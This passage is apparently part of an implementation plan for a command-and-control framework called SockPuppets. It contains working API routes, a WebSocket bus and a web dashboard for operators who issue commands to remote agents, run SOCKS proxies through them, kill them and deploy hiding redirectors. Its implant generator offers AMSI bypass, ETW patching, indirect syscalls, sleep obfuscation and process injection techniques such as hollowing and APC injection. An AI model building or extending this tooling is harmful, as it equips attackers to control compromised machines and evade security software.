    agents = _server.get_agent_list()
    active_ids = {a['id'] for a in _server.get_active_agents()}
    for agent in agents:
        agent['active'] = agent['id'] in active_ids
        warning = _server.check_agent_health(agent['id'])
        agent['health_warning'] = warning
    return agents


@router.get("/agents/{agent_id}")
async def get_agent(agent_id: str, _=Depends(lambda: _auth_dep)):
    if not _server or agent_id not in _server.agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    agent = _server.agents[agent_id]
    info = agent.get_info()
    info['active'] = agent.websocket in _server.active_connections
    info['health_warning'] = _server.check_agent_health(agent_id)
    info['command_history'] = agent.command_history[-50:]
    return info


@router.post("/agents/{agent_id}/command")
async def send_command(agent_id: str, req: CommandRequest, _=Depends(lambda: _auth_dep)):
    if not _server or agent_id not in _server.agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    result = await _server.send_command_to_agent(agent_id, req.command)
    agent = _server.agents.get(agent_id)
    if agent and agent.mode == "beacon":
        return {"queued": True, "message": result}
    return {"output": result}


@router.get("/agents/{agent_id}/results")
async def get_results(agent_id: str, clear: bool = False, _=Depends(lambda: _auth_dep)):
    if not _server or agent_id not in _server.agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    return _server.get_agent_results(agent_id, clear=clear)


@router.post("/agents/{agent_id}/kill")
async def kill_agent(agent_id: str, _=Depends(lambda: _auth_dep)):
    if not _server or agent_id not in _server.agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    result = await _server.kill_agent(agent_id)
    return {"status": "ok", "message": result}


@router.post("/agents/{agent_id}/sleep")
async def set_sleep(agent_id: str, req: SleepRequest, _=Depends(lambda: _auth_dep)):
    if not _server or agent_id not in _server.agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    result = await _server.set_beacon_interval(agent_id, req.interval)
    return {"status": "ok", "message": result}


@router.post("/agents/{agent_id}/upgrade")
async def upgrade_agent(agent_id: str, _=Depends(lambda: _auth_dep)):
    if not _server or agent_id not in _server.agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    result = await _server.upgrade_to_streaming(agent_id)
    return {"status": "ok", "message": result}


@router.post("/agents/{agent_id}/downgrade")
async def downgrade_agent(agent_id: str, req: DowngradeRequest, _=Depends(lambda: _auth_dep)):
    if not _server or agent_id not in _server.agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    result = await _server.downgrade_to_beacon(agent_id, req.interval)
    return {"status": "ok", "message": result}


@router.post("/agents/{agent_id}/socks")
async def start_socks(agent_id: str, req: SocksRequest, _=Depends(lambda: _auth_dep)):
    if not _server or agent_id not in _server.agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    result = await _server.start_socks_proxy(agent_id, req.port)
    return {"status": "ok", "message": result}


@router.delete("/agents/{agent_id}")
async def remove_agent(agent_id: str, _=Depends(lambda: _auth_dep)):
    if not _server or agent_id not in _server.agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    agent = _server.agents[agent_id]
    if agent.websocket in _server.active_connections:
        _server.active_connections.discard(agent.websocket)
    del _server.agents[agent_id]
    return {"status": "ok", "message": f"Agent {agent_id} removed"}


# --- Payload generation ---

@router.post("/generate")
async def generate_agents(req: GenerateRequest, _=Depends(lambda: _auth_dep)):
    from agent import AgentGenerator
    generator = AgentGenerator(patterns=req.patterns)
    results = generator.generate_all(
        c2_host=req.host, c2_port=req.port, encryption_key=req.key,
        beacon_mode=req.beacon_mode, beacon_interval=req.interval, beacon_jitter=req.jitter,
        amsi=req.amsi, etw=req.etw, syscalls=req.syscalls,
        inject=req.inject, inject_target=req.inject_target,
        sleep_obf=req.sleep_obf, idle_encrypt=req.idle_encrypt,
        profile=req.profile, target_os=req.target_os, redirector=req.redirector,
    )
    return {"agents": results}


@router.get("/profiles")
async def list_profiles(_=Depends(lambda: _auth_dep)):
    profiles_dir = Path(__file__).parent.parent / "profiles"
    result = []
    for d in [profiles_dir / "private", profiles_dir]:
        if not d.is_dir():
            continue
        for f in sorted(d.glob("*.yaml")):
            name = f.stem
            if any(p["name"] == name for p in result):
                continue
            try:
                import yaml
                with open(f) as fh:
                    data = yaml.safe_load(fh) or {}
                result.append({"name": name, "description": data.get("description", "")})
            except Exception:
                result.append({"name": name, "description": ""})
    return result


@router.get("/patterns")
async def list_patterns(_=Depends(lambda: _auth_dep)):
    patterns_dir = Path(__file__).parent.parent / "patterns"
    result = []
    for d in [patterns_dir / "private", patterns_dir]:
        if not d.is_dir():
            continue
        for f in sorted(d.glob("*.py")):
            if f.name.startswith("_"):
                continue
            result.append({"name": f.stem})
    return result


@router.get("/download/{filename:path}")
async def download_file(filename: str, _=Depends(lambda: _auth_dep)):
    from fastapi.responses import FileResponse
    output_dir = Path(__file__).parent.parent / "output"
    file_path = output_dir / filename
    if not file_path.exists() or not file_path.resolve().is_relative_to(output_dir.resolve()):
        raise HTTPException(status_code=404, detail="File not found")
    return FileResponse(file_path, filename=file_path.name)


# --- Redirectors ---

@router.get("/redirectors")
async def list_redirectors_api(_=Depends(lambda: _auth_dep)):
    from redirectors import list_redirectors
    configs = list_redirectors()
    return [
        {"name": c.name, "type": c.type, "domain": c.domain, "backend": c.backend, "description": c.description}
        for c in configs
    ]


@router.get("/redirectors/{name}")
async def get_redirector(name: str, _=Depends(lambda: _auth_dep)):
    from redirectors import load_redirector
    try:
        config = load_redirector(name)
        return {
            "name": config.name, "type": config.type, "domain": config.domain,
            "backend": config.backend, "listen": config.listen, "trusted": config.trusted,
            "profile": config.profile, "allow_user_agents": config.allow_user_agents,
            "decoy": config.decoy, "decoy_target": config.decoy_target,
        }
    except FileNotFoundError:
        raise HTTPException(status_code=404, detail=f"Redirector not found: {name}")


@router.post("/redirectors/{name}/deploy")
async def deploy_redirector(name: str, req: DeployRequest, _=Depends(lambda: _auth_dep)):
    from redirectors import load_redirector, generate_deploy_config
    try:
        config = load_redirector(name)
        output = generate_deploy_config(config, req.format)
        return {"config_text": output}
    except FileNotFoundError:
        raise HTTPException(status_code=404, detail=f"Redirector not found: {name}")
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))


# --- Infrastructure ---

@router.get("/infrastructure")
async def get_infrastructure(_=Depends(lambda: _auth_dep)):
    from redirectors import list_redirectors
    agents = _server.get_agent_list() if _server else []
    active_ids = {a['id'] for a in _server.get_active_agents()} if _server else set()
    redirectors = [
        {"name": c.name, "type": c.type, "domain": c.domain, "backend": c.backend}
        for c in list_redirectors() if c.type != "direct"
    ]
    return {
        "server": {
            "running": _server is not None and hasattr(_server, 'ws_server') and _server.ws_server is not None,
            "host": getattr(_server, 'host', ''),
            "port": getattr(_server, 'port', 0),
        },
        "redirectors": redirectors,
        "agents": [
            {"id": a['id'], "hostname": a['hostname'], "mode": a['mode'], "active": a['id'] in active_ids}
            for a in agents
        ],
    }
```

- [ ] **Step 6: Implement gui/ws.py**

```python
"""WebSocket event bus endpoint for real-time GUI updates."""

import asyncio
import json

from fastapi import APIRouter, WebSocket, WebSocketDisconnect, Query

from gui.auth import verify_token

router = APIRouter()

_server = None
_encryption_key = None
_connected_operators: dict[str, WebSocket] = {}


def init(server, encryption_key: bytes):
    global _server, _encryption_key
    _server = server
    _encryption_key = encryption_key


@router.websocket("/api/ws")
async def websocket_endpoint(ws: WebSocket, token: str = Query(""), name: str = Query("operator")):
    if not verify_token(token, _encryption_key):
        await ws.close(code=4001, reason="Unauthorized")
        return

    await ws.accept()
    _connected_operators[name] = ws

    if _server:
        _server.events.emit({"event": "operator_connected", "operator": name})

    event_queue = _server.events.subscribe() if _server else asyncio.Queue()

    try:
        # Send current state snapshot
        agents = _server.get_agent_list() if _server else []
        await ws.send_json({"event": "snapshot", "agents": agents, "operators": list(_connected_operators.keys())})

        # Fan out: read events from bus and forward to this WebSocket
        async def forward_events():
            while True:
                event = await event_queue.get()
                event["operators"] = list(_connected_operators.keys())
                await ws.send_json(event)

        forward_task = asyncio.create_task(forward_events())

        # Also listen for messages from the operator (future: chat, annotations)
        async for message in ws.iter_text():
            pass

    except WebSocketDisconnect:
        pass
    except Exception:
        pass
    finally:
        forward_task.cancel()
        if _server:
            _server.events.unsubscribe(event_queue)
            _server.events.emit({"event": "operator_disconnected", "operator": name})
        _connected_operators.pop(name, None)
```

- [ ] **Step 7: Implement gui/__init__.py**

```python
"""SockPuppets Web GUI — optional FastAPI-based operator dashboard."""

import threading
from pathlib import Path

_gui_thread = None
_uvicorn_server = None


def create_app(server, encryption_key: bytes):
    """Create the FastAPI app. Can be used standalone or via start_gui()."""
    from fastapi import FastAPI, Depends
    from fastapi.staticfiles import StaticFiles

    from gui.auth import AuthMiddleware, derive_token
    from gui import api, ws

    app = FastAPI(title="SockPuppets", docs_url=None, redoc_url=None)

    auth = AuthMiddleware(encryption_key)
    api.init(server, auth)
    ws.init(server, encryption_key)

    app.include_router(api.router, dependencies=[Depends(auth)])
    app.include_router(ws.router)

    static_dir = Path(__file__).parent / "static"
    if static_dir.is_dir():
        app.mount("/", StaticFiles(directory=str(static_dir), html=True), name="static")

    return app


def start_gui(server, encryption_key: bytes, port: int = 13337):
    """Start the GUI server in a background thread. Returns the auth token."""
    global _gui_thread, _uvicorn_server

    from gui.auth import derive_token

    try:
        import uvicorn
    except ImportError:
        raise ImportError("GUI requires fastapi and uvicorn: pip install -r requirements-gui.txt")

    app = create_app(server, encryption_key)
    token = derive_token(encryption_key)

    config = uvicorn.Config(app, host="0.0.0.0", port=port, log_level="warning")
    _uvicorn_server = uvicorn.Server(config)

    _gui_thread = threading.Thread(target=_uvicorn_server.run, daemon=True)
    _gui_thread.start()

    return token


def stop_gui():
    """Stop the GUI server."""
    global _uvicorn_server, _gui_thread
    if _uvicorn_server:
        _uvicorn_server.should_exit = True
        _gui_thread = None
        _uvicorn_server = None
```

- [ ] **Step 8: Run tests to verify they pass**

Run: `cd /Users/ajman/Documents/projects/sockpuppets && python -m pytest tests/test_gui_api.py -v`
Expected: All 6 tests PASS

- [ ] **Step 9: Commit**

```bash
git add gui/ requirements-gui.txt tests/test_gui_api.py
git commit -m "feat: add GUI API layer with auth, REST endpoints, and WebSocket event bus"
```

---

### Task 5: GUI Frontend — HTML, JS, CSS

**Files:**
- Create: `gui/static/index.html` — SPA shell with toolbar, agent table, bottom tabs, modals
- Create: `gui/static/app.js` — all client logic (WebSocket, API calls, DOM, state)
- Create: `gui/static/style.css` — Frutiger Aero theme

**Interfaces:**
- Consumes: All `/api/*` endpoints from Task 4. WebSocket at `/api/ws?token=<token>&name=<name>`.

This task produces the complete frontend. The three files are tightly coupled (the HTML structure, JS selectors, and CSS classes must all agree), so they're one task.

- [ ] **Step 1: Create gui/static/index.html**

The SPA shell. Contains:
- `<header>` toolbar with server status dot, Generate button, dark mode toggle, operator name input
- `<main>` with agent table (`<table id="agent-table">`) as the dominant element
- Draggable divider (`<div id="divider">`)
- Bottom panel with tabs: Console, Event Log, Infrastructure
- Generate modal overlay
- Context menu (hidden, positioned absolutely)
- Login overlay (token + name input, shown before anything else)

Key structure:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SockPuppets</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <!-- Login overlay -->
    <div id="login-overlay">
        <div class="login-card glass">
            <h1>SockPuppets</h1>
            <input type="password" id="login-token" placeholder="Auth Token">
            <input type="text" id="login-name" placeholder="Operator Name" value="operator">
            <button id="login-btn">Connect</button>
        </div>
    </div>

    <!-- Main app (hidden until login) -->
    <div id="app" class="hidden">
        <!-- Toolbar -->
        <header id="toolbar" class="glass">
            <div class="toolbar-left">
                <span class="logo">SockPuppets</span>
                <span id="server-status" class="status-dot red"></span>
                <span id="server-info">Disconnected</span>
            </div>
            <div class="toolbar-center">
                <button id="btn-generate" class="toolbar-btn glass-btn">+ Generate</button>
            </div>
            <div class="toolbar-right">
                <span id="operators-list"></span>
                <button id="btn-theme" class="toolbar-btn glass-btn" title="Toggle theme">&#9789;</button>
            </div>
        </header>

        <!-- Agent table -->
        <section id="main-panel">
            <div id="agent-table-wrapper" class="glass">
                <table id="agent-table">
                    <thead>
                        <tr>
                            <th>ID</th><th>Hostname</th><th>User</th><th>OS</th>
                            <th>IP</th><th>Mode</th><th>Health</th><th>Last Seen</th>
                        </tr>
                    </thead>
                    <tbody id="agent-tbody"></tbody>
                </table>
                <div id="no-agents" class="empty-state">No agents connected</div>
            </div>
        </section>

        <!-- Draggable divider -->
        <div id="divider"></div>

        <!-- Bottom panel -->
        <section id="bottom-panel">
            <div id="tab-bar">
                <button class="tab active" data-tab="event-log">Event Log</button>
            </div>
            <div id="tab-content">
                <div id="tab-event-log" class="tab-pane active">
                    <div id="event-log"></div>
                </div>
            </div>
        </section>
    </div>

    <!-- Context menu -->
    <div id="context-menu" class="glass hidden">
        <button data-action="interact">Interact</button>
        <button data-action="sleep">Sleep...</button>
        <button data-action="socks">SOCKS Proxy...</button>
        <hr>
        <button data-action="upgrade">Upgrade to Streaming</button>
        <button data-action="downgrade">Downgrade to Beacon</button>
        <hr>
        <button data-action="kill" class="danger">Kill Agent</button>
    </div>

    <!-- Generate modal -->
    <div id="generate-modal" class="modal-overlay hidden">
        <div class="modal glass">
            <h2>Generate Payload</h2>
            <form id="generate-form">
                <div class="form-row">
                    <label>Host</label><input type="text" name="host" required>
                    <label>Port</label><input type="number" name="port" value="8443" required>
                </div>
                <div class="form-row">
                    <label>Mode</label>
                    <select name="beacon_mode">
                        <option value="false">Streaming</option>
                        <option value="true">Beacon</option>
                    </select>
                </div>
                <div class="form-row">
                    <label>Profile</label><select name="profile" id="profile-select"></select>
                    <label>Patterns</label><select name="patterns" id="patterns-select"></select>
                </div>
                <div class="form-row">
                    <label>Redirector</label><select name="redirector" id="redirector-select"><option value="">None</option></select>
                </div>
                <fieldset class="evasion-toggles">
                    <legend>Evasion</legend>
                    <label><input type="checkbox" name="amsi"> AMSI Bypass</label>
                    <label><input type="checkbox" name="etw"> ETW Patch</label>
                    <label><input type="checkbox" name="syscalls" value="indirect"> Syscalls</label>
                    <label><input type="checkbox" name="sleep_obf" value="ekko"> Sleep Obf</label>
                    <div class="form-row">
                        <label>Inject</label>
                        <select name="inject">
                            <option value="">None</option>
                            <option value="hollowing">Process Hollowing</option>
                            <option value="createthread">CreateRemoteThread</option>
                            <option value="apc">APC Injection</option>
                            <option value="stomp">Module Stomping</option>
                        </select>
                    </div>
                </fieldset>
                <div class="form-actions">
                    <button type="submit" class="glass-btn primary">Generate</button>
                    <button type="button" class="glass-btn" id="generate-cancel">Cancel</button>
                </div>
            </form>
            <div id="generate-results" class="hidden"></div>
        </div>
    </div>

    <script src="app.js"></script>
</body>
</html>
```

- [ ] **Step 2: Create gui/static/app.js**

The full client-side application. Organized as a single-file module with clear sections:

```javascript
// SockPuppets GUI — Client Application

(function() {
    'use strict';

    // --- State ---
    let ws = null;
    let token = '';
    let operatorName = 'operator';
    let agents = [];
    let selectedAgentId = null;
    let consoleTabs = {};  // agentId -> {element, history}

    const API = '/api';

    // --- Auth helpers ---
    function headers() {
        return { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' };
    }

    async function api(method, path, body) {
        const opts = { method, headers: headers() };
        if (body) opts.body = JSON.stringify(body);
        const resp = await fetch(API + path, opts);
        if (!resp.ok) throw new Error(`${resp.status}: ${await resp.text()}`);
        return resp.json();
    }

    // --- Login ---
    document.getElementById('login-btn').addEventListener('click', () => {
        token = document.getElementById('login-token').value.trim();
        operatorName = document.getElementById('login-name').value.trim() || 'operator';
        if (!token) return;
        connectWebSocket();
    });

    document.getElementById('login-token').addEventListener('keydown', e => {
        if (e.key === 'Enter') document.getElementById('login-btn').click();
    });

    // --- WebSocket ---
    function connectWebSocket() {
        const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
        ws = new WebSocket(`${proto}//${location.host}/api/ws?token=${encodeURIComponent(token)}&name=${encodeURIComponent(operatorName)}`);

        ws.onopen = () => {
            document.getElementById('login-overlay').classList.add('hidden');
            document.getElementById('app').classList.remove('hidden');
            loadProfiles();
            loadPatterns();
            loadRedirectors();
        };

        ws.onmessage = (e) => {
            const data = JSON.parse(e.data);
            handleEvent(data);
        };

        ws.onclose = () => {
            setTimeout(connectWebSocket, 3000);
        };

        ws.onerror = () => {
            document.getElementById('login-overlay').classList.remove('hidden');
            document.getElementById('app').classList.add('hidden');
        };
    }

    // --- Event handler ---
    function handleEvent(data) {
        switch(data.event) {
            case 'snapshot':
                agents = data.agents || [];
                renderAgentTable();
                updateOperators(data.operators || []);
                break;
            case 'agent_registered':
                agents.push(data.agent);
                renderAgentTable();
                addEventLog('agent_registered', `${data.agent.id} (${data.agent.hostname}) connected`);
                break;
            case 'agent_disconnected':
                addEventLog('agent_disconnected', `${data.agent_id} disconnected`);
                refreshAgents();
                break;
            case 'agent_result':
                addEventLog('agent_result', `${data.agent_id}: ${data.command}`);
                if (consoleTabs[data.agent_id]) {
                    appendConsole(data.agent_id, data.output, 'output');
                }
                break;
            case 'command_sent':
            case 'command_queued':
                addEventLog(data.event, `[${data.operator}] ${data.agent_id}: ${data.command}`);
                break;
            case 'operator_connected':
            case 'operator_disconnected':
                updateOperators(data.operators || []);
                addEventLog(data.event, data.operator);
                break;
        }
    }

    // --- Agent table ---
    async function refreshAgents() {
        try {
            agents = await api('GET', '/agents');
            renderAgentTable();
        } catch(e) { console.error(e); }
    }

    function renderAgentTable() {
        const tbody = document.getElementById('agent-tbody');
        const empty = document.getElementById('no-agents');
        tbody.innerHTML = '';

        if (agents.length === 0) {
            empty.classList.remove('hidden');
            return;
        }
        empty.classList.add('hidden');

        for (const agent of agents) {
            const tr = document.createElement('tr');
            tr.dataset.agentId = agent.id;
            const healthClass = agent.active !== false ? 'healthy' : (agent.health_warning ? 'dead' : 'stale');
            const modeBadge = agent.mode === 'beacon' ? '<span class="badge beacon">BEACON</span>' : '<span class="badge stream">STREAM</span>';

            tr.innerHTML = `
                <td class="agent-id">${agent.id}</td>
                <td>${agent.hostname || 'Unknown'}</td>
                <td>${agent.username || 'Unknown'}</td>
                <td>${agent.os || 'Unknown'}</td>
                <td>${agent.ip || 'Unknown'}</td>
                <td>${modeBadge}</td>
                <td><span class="health-dot ${healthClass}"></span></td>
                <td>${agent.last_seen || ''}</td>
            `;

            tr.addEventListener('contextmenu', (e) => showContextMenu(e, agent.id));
            tr.addEventListener('dblclick', () => openConsole(agent.id));
            tbody.appendChild(tr);
        }
    }

    // --- Context menu ---
    function showContextMenu(e, agentId) {
        e.preventDefault();
        selectedAgentId = agentId;
        const menu = document.getElementById('context-menu');
        menu.style.left = e.pageX + 'px';
        menu.style.top = e.pageY + 'px';
        menu.classList.remove('hidden');
    }

    document.addEventListener('click', () => {
        document.getElementById('context-menu').classList.add('hidden');
    });

    document.querySelectorAll('#context-menu button').forEach(btn => {
        btn.addEventListener('click', () => handleContextAction(btn.dataset.action));
    });

    async function handleContextAction(action) {
        if (!selectedAgentId) return;
        try {
            switch(action) {
                case 'interact':
                    openConsole(selectedAgentId);
                    break;
                case 'sleep':
                    const interval = prompt('Beacon interval (seconds):');
                    if (interval) await api('POST', `/agents/${selectedAgentId}/sleep`, { interval: parseInt(interval) });
                    break;
                case 'socks':
                    const port = prompt('SOCKS proxy port:');
                    if (port) await api('POST', `/agents/${selectedAgentId}/socks`, { port: parseInt(port) });
                    break;
                case 'upgrade':
                    await api('POST', `/agents/${selectedAgentId}/upgrade`);
                    break;
                case 'downgrade':
                    const di = prompt('Beacon interval (seconds):', '60');
                    if (di) await api('POST', `/agents/${selectedAgentId}/downgrade`, { interval: parseInt(di) });
                    break;
                case 'kill':
                    if (confirm(`Kill agent ${selectedAgentId}?`)) {
                        await api('POST', `/agents/${selectedAgentId}/kill`);
                        refreshAgents();
                    }
                    break;
            }
        } catch(e) { addEventLog('error', e.message); }
    }

    // --- Console tabs ---
    function openConsole(agentId) {
        if (!consoleTabs[agentId]) {
            const tab = document.createElement('button');
            tab.className = 'tab';
            tab.dataset.tab = `console-${agentId}`;
            tab.textContent = `Console: ${agentId}`;
            tab.addEventListener('click', () => switchTab(`console-${agentId}`));

            const closeBtn = document.createElement('span');
            closeBtn.className = 'tab-close';
            closeBtn.textContent = '×';
            closeBtn.addEventListener('click', (e) => { e.stopPropagation(); closeConsole(agentId); });
            tab.appendChild(closeBtn);

            document.getElementById('tab-bar').appendChild(tab);

            const pane = document.createElement('div');
            pane.id = `tab-console-${agentId}`;
            pane.className = 'tab-pane console-pane';
            pane.innerHTML = `
                <div class="console-output" id="console-output-${agentId}"></div>
                <div class="console-input-row">
                    <span class="console-prompt">agent[${agentId}]&gt;</span>
                    <input type="text" class="console-input" id="console-input-${agentId}" autocomplete="off">
                </div>
            `;
            document.getElementById('tab-content').appendChild(pane);

            const input = document.getElementById(`console-input-${agentId}`);
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') {
                    const cmd = input.value.trim();
                    if (!cmd) return;
                    input.value = '';
                    appendConsole(agentId, `agent[${agentId}]> ${cmd}`, 'command');
                    sendCommand(agentId, cmd);
                }
            });

            consoleTabs[agentId] = { tab, pane };
        }
        switchTab(`console-${agentId}`);
        document.getElementById(`console-input-${agentId}`).focus();
    }

    function closeConsole(agentId) {
        const entry = consoleTabs[agentId];
        if (!entry) return;
        entry.tab.remove();
        entry.pane.remove();
        delete consoleTabs[agentId];
        switchTab('event-log');
    }

    function appendConsole(agentId, text, type) {
        const output = document.getElementById(`console-output-${agentId}`);
        if (!output) return;
        const line = document.createElement('div');
        line.className = `console-line ${type}`;
        line.textContent = text;
        output.appendChild(line);
        output.scrollTop = output.scrollHeight;
    }

    async function sendCommand(agentId, command) {
        try {
            const result = await api('POST', `/agents/${agentId}/command`, { command });
            if (result.output) {
                appendConsole(agentId, result.output, 'output');
            } else if (result.queued) {
                appendConsole(agentId, result.message, 'info');
            }
        } catch(e) {
            appendConsole(agentId, `Error: ${e.message}`, 'error');
        }
    }

    // --- Tab switching ---
    function switchTab(tabId) {
        document.querySelectorAll('.tab').forEach(t => t.classList.toggle('active', t.dataset.tab === tabId));
        document.querySelectorAll('.tab-pane').forEach(p => p.classList.toggle('active', p.id === `tab-${tabId}`));
    }

    // --- Event log ---
    function addEventLog(type, message) {
        const log = document.getElementById('event-log');
        const entry = document.createElement('div');
        entry.className = `event-entry event-${type}`;
        const time = new Date().toLocaleTimeString();
        entry.innerHTML = `<span class="event-time">${time}</span> <span class="event-type">[${type}]</span> ${message}`;
        log.appendChild(entry);
        log.scrollTop = log.scrollHeight;
    }

    // --- Generate modal ---
    document.getElementById('btn-generate').addEventListener('click', () => {
        document.getElementById('generate-modal').classList.remove('hidden');
    });
    document.getElementById('generate-cancel').addEventListener('click', () => {
        document.getElementById('generate-modal').classList.add('hidden');
    });
    document.getElementById('generate-form').addEventListener('submit', async (e) => {
        e.preventDefault();
        const form = new FormData(e.target);
        const body = {
            host: form.get('host'),
            port: parseInt(form.get('port')),
            beacon_mode: form.get('beacon_mode') === 'true',
            profile: form.get('profile') || 'default',
            patterns: form.get('patterns') || 'default',
            redirector: form.get('redirector') || null,
            amsi: !!form.get('amsi'),
            etw: !!form.get('etw'),
            syscalls: form.get('syscalls') || null,
            sleep_obf: form.get('sleep_obf') || null,
            inject: form.get('inject') || null,
        };
        try {
            const result = await api('POST', '/generate', body);
            const div = document.getElementById('generate-results');
            div.classList.remove('hidden');
            div.innerHTML = '<h3>Generated Agents</h3>' +
                Object.entries(result.agents).map(([type, path]) =>
                    `<div class="gen-result"><strong>${type}:</strong> <a href="/api/download/${encodeURIComponent(path.split('/').pop())}" target="_blank">${path}</a></div>`
                ).join('');
        } catch(e) {
            addEventLog('error', `Generate failed: ${e.message}`);
        }
    });

    // --- Load dropdowns ---
    async function loadProfiles() {
        try {
            const profiles = await api('GET', '/profiles');
            const select = document.getElementById('profile-select');
            select.innerHTML = profiles.map(p => `<option value="${p.name}">${p.name}${p.description ? ' — ' + p.description : ''}</option>`).join('');
        } catch(e) {}
    }

    async function loadPatterns() {
        try {
            const patterns = await api('GET', '/patterns');
            const select = document.getElementById('patterns-select');
            select.innerHTML = patterns.map(p => `<option value="${p.name}">${p.name}</option>`).join('');
        } catch(e) {}
    }

    async function loadRedirectors() {
        try {
            const redirectors = await api('GET', '/redirectors');
            const select = document.getElementById('redirector-select');
            select.innerHTML = '<option value="">None (direct)</option>' +
                redirectors.map(r => `<option value="${r.name}">${r.name}${r.domain ? ' (' + r.domain + ')' : ''}</option>`).join('');
        } catch(e) {}
    }

    // --- Operators list ---
    function updateOperators(operators) {
        document.getElementById('operators-list').textContent = operators.join(', ');
    }

    // --- Dark mode toggle ---
    document.getElementById('btn-theme').addEventListener('click', () => {
        document.documentElement.dataset.theme =
            document.documentElement.dataset.theme === 'dark' ? 'light' : 'dark';
    });
    if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.documentElement.dataset.theme = 'dark';
    }

    // --- Draggable divider ---
    const divider = document.getElementById('divider');
    let isDragging = false;
    divider.addEventListener('mousedown', () => isDragging = true);
    document.addEventListener('mousemove', (e) => {
        if (!isDragging) return;
        const pct = (e.clientY / window.innerHeight) * 100;
        document.getElementById('main-panel').style.height = `${pct - 6}%`;
        document.getElementById('bottom-panel').style.height = `${94 - pct}%`;
    });
    document.addEventListener('mouseup', () => isDragging = false);

    // --- Auto-refresh agents every 5s ---
    setInterval(refreshAgents, 5000);

})();
```

- [ ] **Step 3: Create gui/static/style.css**

The Frutiger Aero theme. This is the largest file — it defines all visual styling. Key sections:

```css
/* SockPuppets GUI — Frutiger Aero Theme */

:root {
    /* Light mode (default) */
    --bg-gradient-start: #E3F2FD;
    --bg-gradient-end: #E0F7FA;
    --glass-bg: rgba(255, 255, 255, 0.6);
    --glass-border: rgba(255, 255, 255, 0.8);
    --glass-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
    --text-primary: #263238;
    --text-secondary: #546E7A;
    --text-muted: #90A4AE;
    --primary: #4FC3F7;
    --primary-dark: #00BCD4;
    --green: #66BB6A;
    --amber: #FFA726;
    --red: #EF5350;
    --divider: rgba(0, 0, 0, 0.1);
    --input-bg: rgba(255, 255, 255, 0.8);
    --hover-bg: rgba(79, 195, 247, 0.15);
    --font-ui: -apple-system, 'Segoe UI', system-ui, sans-serif;
    --font-mono: 'SF Mono', 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
    --radius-sm: 8px;
    --radius-md: 12px;
    --radius-lg: 20px;
}

:root[data-theme="dark"] {
    --bg-gradient-start: #0D1117;
    --bg-gradient-end: #0A1929;
    --glass-bg: rgba(20, 20, 30, 0.7);
    --glass-border: rgba(255, 255, 255, 0.1);
    --glass-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
    --text-primary: #E0E0E0;
    --text-secondary: #B0BEC5;
    --text-muted: #78909C;
    --input-bg: rgba(255, 255, 255, 0.1);
    --hover-bg: rgba(79, 195, 247, 0.1);
    --divider: rgba(255, 255, 255, 0.1);
}

* { margin: 0; padding: 0; box-sizing: border-box; }

body {
    font-family: var(--font-ui);
    color: var(--text-primary);
    background: linear-gradient(135deg, var(--bg-gradient-start), var(--bg-gradient-end));
    min-height: 100vh;
    overflow: hidden;
}

/* --- Glass effect --- */
.glass {
    background: var(--glass-bg);
    backdrop-filter: blur(12px);
    -webkit-backdrop-filter: blur(12px);
    border: 1px solid var(--glass-border);
    border-radius: var(--radius-md);
    box-shadow: var(--glass-shadow);
}

.glass-btn {
    background: linear-gradient(180deg, rgba(255,255,255,0.4) 0%, rgba(255,255,255,0.1) 50%, transparent 50%, rgba(0,0,0,0.05) 100%);
    border: 1px solid var(--glass-border);
    border-radius: var(--radius-sm);
    padding: 6px 16px;
    color: var(--text-primary);
    cursor: pointer;
    font-size: 13px;
    transition: all 0.2s ease;
}

:root[data-theme="dark"] .glass-btn {
    background: linear-gradient(180deg, rgba(255,255,255,0.15) 0%, rgba(255,255,255,0.05) 50%, transparent 50%, rgba(0,0,0,0.2) 100%);
}

.glass-btn:hover {
    background: linear-gradient(180deg, rgba(255,255,255,0.5) 0%, rgba(255,255,255,0.2) 50%, transparent 50%, rgba(0,0,0,0.02) 100%);
    box-shadow: 0 2px 8px rgba(79, 195, 247, 0.3);
}

.glass-btn.primary {
    background: linear-gradient(180deg, rgba(79,195,247,0.6) 0%, rgba(0,188,212,0.4) 50%, rgba(0,188,212,0.5) 50%, rgba(0,188,212,0.6) 100%);
    color: white;
    border-color: rgba(0,188,212,0.5);
}

.hidden { display: none !important; }

/* --- Login --- */
#login-overlay {
    position: fixed; inset: 0; z-index: 1000;
    display: flex; align-items: center; justify-content: center;
    background: linear-gradient(135deg, var(--bg-gradient-start), var(--bg-gradient-end));
}

.login-card {
    padding: 40px; text-align: center; width: 360px;
}

.login-card h1 {
    font-size: 28px; margin-bottom: 24px;
    background: linear-gradient(135deg, var(--primary), var(--primary-dark));
    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
}

.login-card input {
    display: block; width: 100%; padding: 10px 14px; margin-bottom: 12px;
    border: 1px solid var(--glass-border); border-radius: var(--radius-sm);
    background: var(--input-bg); color: var(--text-primary);
    font-size: 14px; font-family: var(--font-mono);
}

.login-card button {
    width: 100%; padding: 10px; margin-top: 8px;
}

/* --- Toolbar --- */
#toolbar {
    display: flex; align-items: center; justify-content: space-between;
    padding: 8px 16px; margin: 8px 8px 0;
    border-radius: var(--radius-md) var(--radius-md) 0 0;
}

.toolbar-left, .toolbar-center, .toolbar-right { display: flex; align-items: center; gap: 10px; }

.logo {
    font-weight: 700; font-size: 16px;
    background: linear-gradient(135deg, var(--primary), var(--primary-dark));
    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
}

.status-dot {
    width: 10px; height: 10px; border-radius: 50%; display: inline-block;
}
